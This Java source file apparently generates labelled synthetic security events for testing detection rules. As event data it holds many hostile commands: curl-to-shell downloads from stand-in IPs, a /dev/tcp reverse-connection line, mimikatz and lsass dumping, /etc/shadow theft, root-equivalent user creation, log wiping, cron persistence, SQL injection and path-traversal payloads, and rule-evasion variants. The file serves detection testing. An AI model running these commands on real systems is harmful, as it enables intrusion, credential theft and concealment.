package com.jk.explore.security.detectioncode;

import static com.jk.explore.security.detectioncode.Corpus.m;

import java.util.Random;

/**
 * Labelled attacks: for each rule 8 that the rule is written for and 2 evasions it is not (a different binary, a different spelling),
 * and some attacks with no rule at all. Every row is one attack of one event, except the failed-login campaigns.
 */
final class Attacks {

    private static final String JAVA = "/usr/lib/jvm/java-21/bin/java";
    private static final String WIN = "C:\\Windows\\System32\\";

    /** rule, technique, kind, host kind, parent, image, command line, user. */
    private static final String[][] PROCESSES = {
        {"web-server-shell", "T1505.003", "attack", "web", "/usr/sbin/nginx", "/bin/sh", "sh -c id", "www-data"},
        {"web-server-shell", "T1505.003", "attack", "web", "/usr/sbin/php-fpm", "/bin/bash", "bash -c 'cat /etc/passwd'", "www-data"},
        {"web-server-shell", "T1505.003", "attack", "app", JAVA, "/bin/sh", "sh -c 'uname -a; whoami'", "tomcat"},
        {"web-server-shell", "T1505.003", "attack", "web", "/usr/sbin/httpd", "/bin/bash", "/bin/bash -i", "apache"},
        {"web-server-shell", "T1505.003", "attack", "app", JAVA, "/bin/bash", "bash -c 'exec 5<>/dev/tcp/203.0.113.9/4444'", "tomcat"},
        {"web-server-shell", "T1505.003", "attack", "web", "/usr/sbin/nginx", "/bin/dash", "dash -c 'ls -la /var/www/html/uploads'", "www-data"},
        {"web-server-shell", "T1505.003", "attack", "web", "/usr/sbin/php-fpm", "/bin/sh", "sh -c 'ls -la /var/www/html/uploads'", "www-data"},
        {"web-server-shell", "T1505.003", "attack", "app", JAVA, "/bin/sh", "sh -c 'cat /opt/bank/conf/db.properties'", "tomcat"},
        {"web-server-shell", "T1505.003", "evasion", "web", "/usr/sbin/php-fpm", "/usr/bin/python3", "python3 -c 'import os; os.system(\"id\")'", "www-data"},
        {"web-server-shell", "T1505.003", "evasion", "app", JAVA, "/bin/sh", "/bin/sh -c /opt/bank/bin/healthcheck --deep; cat /etc/passwd", "tomcat"},
        {"web-server-shell", "T1505.003", "evasion", "web", "/usr/sbin/apache2", "/bin/sh", "sh -c id", "www-data"},

        {"new-admin-user", "T1136.001", "attack", "any", "/bin/bash", "/usr/sbin/useradd", "useradd -m -G sudo backup2", "ops-tmp"},
        {"new-admin-user", "T1136.001", "attack", "any", "/bin/bash", "/usr/sbin/useradd", "useradd -o -u 0 -g 0 toor", "tomcat"},
        {"new-admin-user", "T1098", "attack", "any", "/bin/bash", "/usr/sbin/usermod", "usermod -aG sudo svc-report", "emp131"},
        {"new-admin-user", "T1098", "attack", "any", "/bin/bash", "/usr/sbin/usermod", "usermod -aG wheel helpdesk7", "emp142"},
        {"new-admin-user", "T1136.001", "attack", "any", "/bin/bash", "/usr/sbin/adduser", "adduser -G wheel -m night", "emp150"},
        {"new-admin-user", "T1136.001", "attack", "any", "/bin/sh", "/usr/sbin/useradd", "useradd -m -G wheel -s /bin/bash audit2", "www-data"},
        {"new-admin-user", "T1098", "attack", "any", "/bin/bash", "/usr/sbin/usermod", "usermod -a -G sudo emp160", "emp160"},
        {"new-admin-user", "T1136.001", "attack", "any", "/bin/bash", "/usr/sbin/useradd", "useradd -u 0 -o -N root2", "emp170"},
        {"new-admin-user", "T1136.001", "evasion", "any", "/bin/bash", "/usr/sbin/useradd", "useradd -m -g 27 svc-x", "emp133"},
        {"new-admin-user", "T1098", "evasion", "any", "/bin/bash", "/usr/bin/gpasswd", "gpasswd -a helper sudo", "emp134"},

        {"credential-dump-tools", "T1003.001", "attack", "win", WIN + "cmd.exe", "C:\\Users\\Public\\mimikatz.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit", "svc-deploy"},
        {"credential-dump-tools", "T1003.001", "attack", "win", WIN + "cmd.exe", "C:\\Tools\\procdump.exe", "procdump.exe -ma lsass.exe lsass.dmp", "svc-deploy"},
        {"credential-dump-tools", "T1003.001", "attack", "any", "/bin/bash", "/usr/local/bin/secretsdump.py", "secretsdump.py bank/admin@10.20.5.5", "emp140"},
        {"credential-dump-tools", "T1003.001", "attack", "any", "/bin/bash", "/opt/tools/lazagne", "lazagne all", "emp141"},
        {"credential-dump-tools", "T1003.008", "attack", "any", "/bin/bash", "/bin/cp", "cp /etc/shadow /tmp/s.txt", "tomcat"},
        {"credential-dump-tools", "T1003.008", "attack", "any", "/bin/bash", "/bin/cat", "cat /etc/shadow", "www-data"},
        {"credential-dump-tools", "T1003.008", "attack", "any", "/bin/bash", "/bin/tar", "tar czf /tmp/x.tgz /etc/shadow /etc/passwd", "emp143"},
        {"credential-dump-tools", "T1003.001", "attack", "win", WIN + "cmd.exe", "C:\\Windows\\Temp\\m.exe", "m.exe sekurlsa::pth /user:admin", "svc-deploy"},
        {"credential-dump-tools", "T1003.001", "evasion", "win", WIN + "cmd.exe", WIN + "rundll32.exe", "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\Temp\\out.bin full", "svc-deploy"},
        {"credential-dump-tools", "T1003.002", "evasion", "win", WIN + "cmd.exe", "C:\\Windows\\Temp\\svc.exe", "svc.exe lsadump::sam", "svc-deploy"},

        {"download-pipe-shell", "T1105", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'curl -s http://203.0.113.9/a.sh | sh'", "tomcat"},
        {"download-pipe-shell", "T1105", "attack", "any", "/bin/bash", "/bin/bash", "bash -c 'wget -qO- http://203.0.113.9/a.sh | bash'", "www-data"},
        {"download-pipe-shell", "T1105", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'curl -fsSL http://198.51.100.7/i.sh|bash'", "emp144"},
        {"download-pipe-shell", "T1105", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'wget -O- http://198.51.100.7/i.sh | sh'", "emp145"},
        {"download-pipe-shell", "T1105", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'curl -k https://203.0.113.20/x |sh'", "tomcat"},
        {"download-pipe-shell", "T1105", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'wget -q -O - http://203.0.113.20/x | bash'", "emp146"},
        {"download-pipe-shell", "T1105", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'curl http://203.0.113.30/s | bash -s'", "emp147"},
        {"download-pipe-shell", "T1105", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'wget http://203.0.113.30/s -O - | sh -s'", "emp148"},
        {"download-pipe-shell", "T1105", "evasion", "any", "/bin/bash", "/bin/bash", "bash <(curl -s http://203.0.113.9/a.sh)", "emp149"},
        {"download-pipe-shell", "T1105", "evasion", "any", "/bin/bash", "/bin/sh", "sh -c 'curl -s http://203.0.113.9/a.sh | /bin/sh'", "emp151"},

        {"log-clearing", "T1070.002", "attack", "any", "/bin/bash", "/usr/bin/rm", "rm -rf /var/log/secure", "emp152"},
        {"log-clearing", "T1070.002", "attack", "any", "/bin/bash", "/usr/bin/truncate", "truncate -s 0 /var/log/auth.log", "tomcat"},
        {"log-clearing", "T1070.002", "attack", "any", "/bin/bash", "/usr/bin/shred", "shred -u /var/log/wtmp", "emp153"},
        {"log-clearing", "T1070.003", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'history -c'", "emp154"},
        {"log-clearing", "T1070.003", "attack", "any", "/bin/bash", "/bin/bash", "bash -c 'unset HISTFILE; exit'", "emp155"},
        {"log-clearing", "T1070.001", "attack", "win", WIN + "cmd.exe", WIN + "wevtutil.exe", "wevtutil.exe cl Security", "svc-deploy"},
        {"log-clearing", "T1070.002", "attack", "any", "/bin/bash", "/usr/bin/rm", "rm /var/log/bank/app.log", "emp156"},
        {"log-clearing", "T1070.002", "attack", "app", "/bin/bash", "/usr/bin/rm", "rm -f /var/log/bank-batch/current.log", "tomcat"},
        {"log-clearing", "T1070.002", "evasion", "any", "/bin/bash", "/bin/sh", "sh -c ': > /var/log/auth.log'", "emp157"},
        {"log-clearing", "T1070.002", "evasion", "any", "/bin/bash", "/usr/bin/find", "find /var/log -type f -delete", "emp158"},

        {"scheduled-task-persistence", "T1053.003", "attack", "any", "/bin/bash", "/bin/sh", "sh -c '(crontab -l; echo \"*/5 * * * * curl http://203.0.113.9/p | sh\") | crontab -'", "tomcat"},
        {"scheduled-task-persistence", "T1053.003", "attack", "any", "/bin/bash", "/bin/sh", "sh -c '(crontab -l; echo \"*/5 * * * * wget -q http://203.0.113.9/p -O /tmp/p\") | crontab -'", "www-data"},
        {"scheduled-task-persistence", "T1053.003", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'echo \"0 * * * * /tmp/.h\" | crontab -'", "emp159"},
        {"scheduled-task-persistence", "T1053.003", "attack", "any", "/bin/bash", "/usr/bin/crontab", "crontab /tmp/evil.cron", "emp161"},
        {"scheduled-task-persistence", "T1053.003", "attack", "any", "/bin/bash", "/bin/sh", "sh -c 'echo ZWNobyBoaQ== | base64 -d | crontab -'", "emp162"},
        {"scheduled-task-persistence", "T1053.005", "attack", "win", WIN + "cmd.exe", WIN + "schtasks.exe", "schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc minute", "svc-batch"},
        {"scheduled-task-persistence", "T1053.005", "attack", "win", WIN + "cmd.exe", WIN + "schtasks.exe", "schtasks /create /tn Sync /tr C:\\Windows\\Temp\\s.exe /sc onlogon", "emp163"},
        {"scheduled-task-persistence", "T1053.003", "attack", "any", "/bin/bash", "/bin/sh", "sh -c '(crontab -l; echo \"@reboot /tmp/.k\") | crontab -'", "emp164"},
        {"scheduled-task-persistence", "T1053.003", "evasion", "any", "/bin/bash", "/usr/bin/tee", "tee /etc/cron.d/sync", "emp165"},
        {"scheduled-task-persistence", "T1053.006", "evasion", "any", "/bin/bash", "/usr/bin/systemctl", "systemctl enable --now sync.timer", "emp166"},

        {"-", "T1046", "uncovered", "bast", "/bin/bash", "/usr/bin/nmap", "nmap -sS -p 1-1024 10.20.0.0/24", "emp167"},
        {"-", "T1046", "uncovered", "bast", "/bin/bash", "/usr/bin/nmap", "nmap -sV 10.20.4.0/24", "emp168"},
        {"-", "T1046", "uncovered", "bast", "/bin/bash", "/usr/bin/nmap", "nmap -p 22,443,5432 10.20.5.0/24", "emp169"},
    };

    /** web injection: kind, technique, query (decoded once; the uri holds it encoded). */
    private static final String[][] WEB = {
        {"attack", "T1190", "' or 1=1 --"},
        {"attack", "T1190", "x' union select user,password from accounts--"},
        {"attack", "T1190", "../../etc/passwd"},
        {"attack", "T1190", "1; drop table accounts; --"},
        {"attack", "T1190", "1' OR '1'='1"},
        {"attack", "T1190", "1 UNION SELECT null,null,null"},
        {"attack", "T1190", "name=../../../../etc/shadow"},
        {"attack", "T1190", "id=1 union select 1,2,3"},
        {"evasion", "T1190", "1 UNI/**/ON SEL/**/ECT 1"},
        {"evasion", "T1190", "..%2f..%2fetc%2fpasswd"},
    };

    private Attacks() {
    }

    static void events(Corpus.Sink s) {
        Random r = s.r;
        for (String[] p : PROCESSES) {
            int inst = s.newInstance();
            String type = p[3].equals("win") ? "winproc" : "process_creation";
            s.add(s.anyTime(r.nextInt(Corpus.DAYS)), m("EventType", type, "host", Benign.host(r, p[3]), "ParentImage", p[4], "Image", p[5], "CommandLine", p[6], "User", p[7]), p[2], p[0], p[1], inst);
        }
        // the Windows security log cleared: event 1102 on a Windows server, caught by an event id and not by a command
        s.add(s.anyTime(r.nextInt(Corpus.DAYS)), m("EventType", "winlog", "host", Benign.host(r, "win"), "EventID", "1102", "User", "svc-deploy"), "attack", "log-clearing", "T1070.001", s.newInstance());
        for (String[] w : WEB) {
            int inst = s.newInstance();
            String ip = "203.0.113." + (10 + r.nextInt(200));
            s.add(s.anyTime(r.nextInt(Corpus.DAYS)), Benign.web(Benign.host(r, "web"), ip, "GET", "/search/faq", w[2], r.nextBoolean() ? "500" : "200", "-"), w[0], "web-injection-probe", w[1], inst);
        }
        campaigns(s);
        for (int i = 0; i < 3; i++) {
            s.add(s.anyTime(r.nextInt(Corpus.DAYS)), m("EventType", "dns", "host", "dns-01", "src_ip", "10.20.3." + (20 + i), "query",
                    "aGVsbG8gd29ybGQ" + i + ".kq9x" + r.nextInt(900) + ".t.example.net", "qtype", "TXT"), "uncovered", "-", "T1048.003", s.newInstance());
        }
        for (int i = 0; i < 4; i++) {
            s.add(s.anyTime(r.nextInt(Corpus.DAYS)), m("EventType", "login", "host", "db-01", "service", "sshd", "User", "svc-report", "src_ip", "10.20.2." + (30 + i),
                    "outcome", "success"), "uncovered", "-", "T1021.004", s.newInstance());
        }
    }

    /** Failed-login campaigns: 8 fast ones (spraying many users, or guessing one) and 2 slow ones that stay under any threshold. */
    private static void campaigns(Corpus.Sink s) {
        Random r = s.r;
        for (int i = 0; i < 10; i++) {
            boolean slow = i >= 8;
            int inst = s.newInstance();
            int day = r.nextInt(Corpus.DAYS);
            int start = r.nextInt(80_000);
            String ip = "203.0.113." + (100 + i);
            int n = slow ? 24 : 14 + r.nextInt(27);
            int gap = slow ? 110 : 3 + r.nextInt(8);
            boolean spray = i % 2 == 0;
            for (int k = 0; k < n; k++) {
                String user = spray ? "cust" + (10_000 + r.nextInt(9_000)) : "cust" + (10_000 + i);
                s.add(s.at(day, start + k * gap), Benign.login(r, user, ip, false), slow ? "evasion" : "attack", "failed-login-burst", spray ? "T1110.003" : "T1110.001", inst);
            }
        }
    }
}
